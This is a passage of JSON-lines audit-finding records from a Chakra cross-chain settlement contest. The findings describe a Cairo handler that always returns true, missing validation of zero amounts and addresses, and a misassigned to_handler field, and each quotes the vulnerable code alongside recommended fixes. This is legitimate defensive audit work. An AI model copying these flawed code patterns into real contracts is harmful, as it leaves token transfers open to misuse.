SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L356\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L135\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L356\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L135\n\n\n# Vulnerability details\n\n## Impact\nWhen receiving a message via the `settlement.cairo::receive_cross_chain_msg()` function, a call is made to `handler.receive_cross_chain_msg` and the return value of that call is used to mark the message with status `SUCCESS` or `FAILED`\n\nHowever, the way that the `handler.receive_cross_chain_msg` function is implemented, it'll always return true, therefore marking every message as successful even if the message for some reason was a corrupted one.\n\nAnd breaking one of the main invariants that states the message statuses should be tracked correctly.\n## Proof of Concept\nLet's take a look at the code of the `receive_cross_chain_msg` function on the settlement.cairo contract, and specifically at the part where the call to `handler.receive_cross_chain_msg` is made:\n```\nfn receive_cross_chain_msg(/*params*/) -> bool {\n//rest of the code\n\nlet success = handler.receive_cross_chain_msg(\n                cross_chain_msg_id,\n                from_chain, //from_chain\n                to_chain,  //to_chain\n                from_handler, //from_handler\n                to_handler , //to_handler\n                payload     //payload\n            );\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n}\n```\nAs you can see, the status of the messages is based on the return value of this line: `success = handler.receive_cross_chain_msg`.\n\nLet's see the `handler.receive_cross_chain_msg` function:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            payload: Array<u8>\n            ) -> bool{\n\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))),\n                    'not support handler');\n                    //i.e (from_chain, to_handler)\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n\n            let payload_transfer = message.payload;\n\n            let transfer = decode_transfer(payload_transfer);\n\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            // Handle the cross-chain transfer according to the settlement mode set in the contract.\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\nAs you can see, as long as the function doesn't revert, it'll always return `true`.\n\nThis shouldn't be the case and if for some reason the message is a corrupted one, it should get marked as `FAILED` as intended by the protocol.\n\nThe functionality is correctly implemented in the solidity version:\n```\nfunction receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nImplement the functionality like in the solidity handler function so it returns `false` if something goes wrong.\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L356\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L135\n\n\n# Vulnerability details\n\n## Impact\nWhen receiving a message via the `settlement.cairo::receive_cross_chain_msg()` function, a call is made to `handler.receive_cross_chain_msg` and the return value of that call is used to mark the message with status `SUCCESS` or `FAILED`\n\nHowever, the way that the `handler.receive_cross_chain_msg` function is implemented, it'll always return true, therefore marking every message as successful even if the message for some reason was a corrupted one.\n\nAnd breaking one of the main invariants that states the message statuses should be tracked correctly. \n## Proof of Concept\nLet's take a look at the code of the `receive_cross_chain_msg` function on the settlement.cairo contract, and specifically at the part where the call to `handler.receive_cross_chain_msg` is made:\n```\nfn receive_cross_chain_msg(/*params*/) -> bool {\n//rest of the code\n\nlet success = handler.receive_cross_chain_msg(\n                cross_chain_msg_id, \n                from_chain, //from_chain\n                to_chain,  //to_chain\n                from_handler, //from_handler\n                to_handler , //to_handler\n                payload     //payload\n            );\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n}\n```\nAs you can see, the status of the messages is based on the return value of this line: `success = handler.receive_cross_chain_msg`.\n\nLet's see the `handler.receive_cross_chain_msg` function:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState, \n            cross_chain_msg_id: u256, \n            from_chain: felt252, \n            to_chain: felt252,\n            from_handler: u256, \n            to_handler: ContractAddress, \n            payload: Array<u8>\n            ) -> bool{\n            \n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \n                    'not support handler'); \n                    //i.e (from_chain, to_handler)\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            \n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            \n            let payload_transfer = message.payload;\n            \n            let transfer = decode_transfer(payload_transfer);\n            \n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            \n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n\n            // Handle the cross-chain transfer according to the settlement mode set in the contract.\n\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            \n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            \n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            \n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n            \n            return true;\n        }\n```\nAs you can see, as long as the function doesn't revert, it'll always return `true`. \n\nThis shouldn't be the case and if for some reason the message is a corrupted one, it should get marked as `FAILED` as intended by the protocol. \n\nThe functionality is correctly implemented in the solidity version:\n```\nfunction receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nImplement the functionality like in the solidity handler function so it returns `false` if something goes wrong.\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-168", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 168, "page_start": null, "title": "A cross-chain message can be initiated with invalid parameters", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232\n\n\n# Vulnerability details\n\n## Impact\nAnyone can initiate a cross-chain ERC20 settlement with invalid parameters, breaking an invariant due to missing validations.\n\nFor example if these values are non-existent or zero values, it would boil down to the following:\n- zero `amount` ---> Only wastes validators resources by signing the `msgHash` at destination only for `zero tokens` to be minted/unlocked to the recipient\n- zero `t0` ---> If this translates to `address(0)`, the transfer mechanism used during unlocking will revert\n- zero `to_token` ---> Recipients will expect to receive tokens at destination but if this token specified is non-existent, they wont receive any.\n\n## Proof of Concept\nOne of the Main Invariants in Settlement Handler Contract is:\n> Cross-chain ERC20 settlements can only be initiated with a valid amount (greater than 0), a valid recipient address, a valid handler address, and a valid token address.\n\nThis is enforced in [`ChakraSettlementHandler::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L118-L121) as follows:\n```solidity\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n```\nHowever, this is not enforced in [`handler_erc20::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232):\n```solidity\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            ---SNIP---\n        }\n```\nAs seen, the function only checks for handler validity but performs no validations for `to_token`, `to`, and `amount`.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the following checks to the `cross_chain_erc20_settlement()` function in `handler_erc20`:\n```diff\n+       assert(amount > 0, 'Amount must be greater than 0');\n+       assert(to != 0, 'Invalid to address');\n+       assert(to_handler != 0, 'Invalid to handler address');\n+       assert(to_token != 0, 'Invalid to token address');\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nAnyone can initiate a cross-chain ERC20 settlement with invalid parameters, breaking an invariant due to missing validations.\n\nFor example if these values are non-existent or zero values, it would boil down to the following:\n- zero `amount` ---> Only wastes validators resources by signing the `msgHash` at destination only for `zero tokens` to be minted/unlocked to the recipient\n- zero `t0` ---> If this translates to `address(0)`, the transfer mechanism used during unlocking will revert\n- zero `to_token` ---> Recipients will expect to receive tokens at destination but if this token specified is non-existent, they wont receive any.\n", "recommendation_md": "## Recommended Mitigation Steps\nAdd the following checks to the `cross_chain_erc20_settlement()` function in `handler_erc20`:\n```diff\n+       assert(amount > 0, 'Amount must be greater than 0');\n+       assert(to != 0, 'Invalid to address');\n+       assert(to_handler != 0, 'Invalid to handler address');\n+       assert(to_token != 0, 'Invalid to token address');\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nOne of the Main Invariants in Settlement Handler Contract is:\n> Cross-chain ERC20 settlements can only be initiated with a valid amount (greater than 0), a valid recipient address, a valid handler address, and a valid token address.\n\nThis is enforced in [`ChakraSettlementHandler::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L118-L121) as follows:\n```solidity\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n```\nHowever, this is not enforced in [`handler_erc20::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232):\n```solidity\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            ---SNIP---\n        }\n```\nAs seen, the function only checks for handler validity but performs no validations for `to_token`, `to`, and `amount`.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232\n\n\n# Vulnerability details\n\n## Impact\nAnyone can initiate a cross-chain ERC20 settlement with invalid parameters, breaking an invariant due to missing validations.\n\nFor example if these values are non-existent or zero values, it would boil down to the following:\n- zero `amount` ---> Only wastes validators resources by signing the `msgHash` at destination only for `zero tokens` to be minted/unlocked to the recipient\n- zero `t0` ---> If this translates to `address(0)`, the transfer mechanism used during unlocking will revert\n- zero `to_token` ---> Recipients will expect to receive tokens at destination but if this token specified is non-existent, they wont receive any.\n\n## Proof of Concept\nOne of the Main Invariants in Settlement Handler Contract is:\n> Cross-chain ERC20 settlements can only be initiated with a valid amount (greater than 0), a valid recipient address, a valid handler address, and a valid token address.\n\nThis is enforced in [`ChakraSettlementHandler::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L118-L121) as follows:\n```solidity\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n```\nHowever, this is not enforced in [`handler_erc20::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232):\n```solidity\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            ---SNIP---\n        }\n```\nAs seen, the function only checks for handler validity but performs no validations for `to_token`, `to`, and `amount`.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the following checks to the `cross_chain_erc20_settlement()` function in `handler_erc20`:\n```diff\n+       assert(amount > 0, 'Amount must be greater than 0');\n+       assert(to != 0, 'Invalid to address');\n+       assert(to_handler != 0, 'Invalid to handler address');\n+       assert(to_token != 0, 'Invalid to token address');\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232\n\n\n# Vulnerability details\n\n## Impact\nAnyone can initiate a cross-chain ERC20 settlement with invalid parameters, breaking an invariant due to missing validations.\n\nFor example if these values are non-existent or zero values, it would boil down to the following:\n- zero `amount` ---> Only wastes validators resources by signing the `msgHash` at destination only for `zero tokens` to be minted/unlocked to the recipient\n- zero `t0` ---> If this translates to `address(0)`, the transfer mechanism used during unlocking will revert\n- zero `to_token` ---> Recipients will expect to receive tokens at destination but if this token specified is non-existent, they wont receive any.\n\n## Proof of Concept\nOne of the Main Invariants in Settlement Handler Contract is:\n> Cross-chain ERC20 settlements can only be initiated with a valid amount (greater than 0), a valid recipient address, a valid handler address, and a valid token address.\n\nThis is enforced in [`ChakraSettlementHandler::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L118-L121) as follows:\n```solidity\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n```\nHowever, this is not enforced in [`handler_erc20::cross_chain_erc20_settlement()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L167-L232):\n```solidity\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n            \n            ---SNIP---\n        }\n```\nAs seen, the function only checks for handler validity but performs no validations for `to_token`, `to`, and `amount`.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the following checks to the `cross_chain_erc20_settlement()` function in `handler_erc20`:\n```diff\n+       assert(amount > 0, 'Amount must be greater than 0');\n+       assert(to != 0, 'Invalid to address');\n+       assert(to_handler != 0, 'Invalid to handler address');\n+       assert(to_token != 0, 'Invalid to token address');\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-171", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 171, "page_start": null, "title": "Settlement contract is mistakenly used for the handler contract when assigning ReceivedCrossChainTx struct", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L211\n\n\n# Vulnerability details\n\n## Impact\n\n`receive_cross_chain_msg()` is located in the Settlement contract and is called after the Chakra network signature verification process. However, when creating `ReceivedCrossChainTx` struct for the new `receive_cross_txs[txid]`, the contract mistakenly uses `address(this)` instead of `to_handler` address.\n\n## Proof of Concept\n\nCurrently `receive_cross_txs[txId]` is assigned this way:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L205-214\n```\n receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n```\n\nHowever, `address(this)` should be replaced by `to_handler`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L31-40\n```\nstruct ReceivedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        uint256 from_address;\n        uint256 from_handler;\n        address to_handler;\n        bytes payload;\n        CrossChainMsgStatus status;\n    }\n\n```\n\nAs you can see here, after `from_handler`, there is `to_handler` address but it's mistakenly set as `address(this)` which is an address of the settlement contract in reality.\n\nTherefore, `receive_cross_txs[txid]` has incorrect parameters when creating a new received transaction struct.\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nChange `address(this)` on `to_handler` address in a `receive_cross_txs[txid]` mapping.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\n`receive_cross_chain_msg()` is located in the Settlement contract and is called after the Chakra network signature verification process. However, when creating `ReceivedCrossChainTx` struct for the new `receive_cross_txs[txid]`, the contract mistakenly uses `address(this)` instead of `to_handler` address.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nChange `address(this)` on `to_handler` address in a `receive_cross_txs[txid]` mapping.\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n\nCurrently `receive_cross_txs[txId]` is assigned this way:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L205-214\n```\n receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n```\n\nHowever, `address(this)` should be replaced by `to_handler`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L31-40\n```\nstruct ReceivedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        uint256 from_address;\n        uint256 from_handler;\n        address to_handler;\n        bytes payload;\n        CrossChainMsgStatus status;\n    }\n\n```\n\nAs you can see here, after `from_handler`, there is `to_handler` address but it's mistakenly set as `address(this)` which is an address of the settlement contract in reality.\n\nTherefore, `receive_cross_txs[txid]` has incorrect parameters when creating a new received transaction struct.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L211\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L211\n\n\n# Vulnerability details\n\n## Impact\n\n`receive_cross_chain_msg()` is located in the Settlement contract and is called after the Chakra network signature verification process. However, when creating `ReceivedCrossChainTx` struct for the new `receive_cross_txs[txid]`, the contract mistakenly uses `address(this)` instead of `to_handler` address.\n\n## Proof of Concept\n\nCurrently `receive_cross_txs[txId]` is assigned this way:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L205-214\n```\n receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            